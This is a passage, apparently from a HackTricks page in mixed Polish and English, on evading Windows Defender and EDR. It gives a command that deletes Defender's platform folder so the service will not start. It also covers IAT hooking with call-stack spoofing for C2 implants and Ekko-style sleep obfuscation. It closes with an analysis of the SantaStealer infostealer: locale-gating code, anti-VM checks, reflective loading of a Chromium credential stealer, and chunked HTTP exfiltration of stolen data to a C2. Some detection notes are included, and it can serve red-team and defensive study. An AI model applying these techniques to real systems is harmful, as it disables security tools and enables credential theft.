- DLL sideloading/code execution: Drop/replace DLLs, które Defender ładuje z katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, tak aby przy następnym uruchomieniu skonfigurowana ścieżka nie była rozwiązywana i Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Należy pamiętać, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły red team mogą przenieść unikanie wykrycia w czasie działania z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, position‑independent code (PIC). To rozszerza możliwości omijania poza wąski powierzchniowy zestaw API, który wiele kitów eksponuje (np. CreateProcessA), i stosuje te same zabezpieczenia do BOFs i post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt Beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relocacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders takie jak TitanLdr/AceLdr demonstrują hooking podczas DllMain ładowanego modułu.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Integracja operacyjna
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Wykrywanie/DFIR — uwagi
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Powiązane elementy i przykłady
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Variant A przegląda listę procesów, hashuje każdą nazwę niestandardowym rolling checksum i porównuje ją z osadzonymi blocklists dla debuggers/sandboxes; powtarza sumę kontrolną dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Variant B sprawdza właściwości systemu (process-count floor, recent uptime), wywołuje `OpenServiceA("VBoxGuest")` aby wykryć VirtualBox additions, oraz wykonuje testy czasowe wokół sleepów, żeby wypatrzyć single-stepping. Każde trafienie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + double ChaCha20 reflective loading

- Główny DLL/EXE osadza Chromium credential helper, który jest albo zrzucany na dysk, albo ręcznie mapowany w pamięci; tryb fileless sam rozwiązuje importy/relokacje, więc żadne artefakty helpera nie są zapisywane.
- Ten helper przechowuje second-stage DLL zaszyfrowany dwukrotnie ChaCha20 (dwa 32-bajtowe klucze + 12-bajtowe nonces). Po obu przebiegach reflectively ładuje blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routyny ChromElevator używają direct-syscall reflective process hollowing do wstrzyknięcia się do działającej przeglądarki Chromium, odzyskują AppBound Encryption keys i odszyfrowują hasła/cookies/karty kredytowe bezpośrednio z baz SQLite pomimo ABE hardening.

### Modularne zbieranie w pamięci i chunked HTTP exfil

- `create_memory_based_log` iteruje globalną tablicę wskaźników funkcji `memory_generators` i uruchamia po jednym wątku na każdy włączony moduł (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarki itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i raportuje liczbę plików po ~45s oknie join.
- Po zakończeniu wszystko jest spakowane przy użyciu statycznie linkowanej biblioteki `miniz` jako `%TEMP%\\Log.zip`. `ThreadPayload1` następnie śpi 15s i strumieniuje archiwum w kawałkach po 10 MB przez HTTP POST do `http://<C2>:6767/upload`, podszywając się pod boundary przeglądarki `multipart/form-data` (`----WebKitFormBoundary***`). Każdy chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcjonalnie `w: <campaign_tag>`, a ostatni chunk dopisuje `complete: true`, aby C2 wiedziało, że reassembly jest zakończone.

## Referencje

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
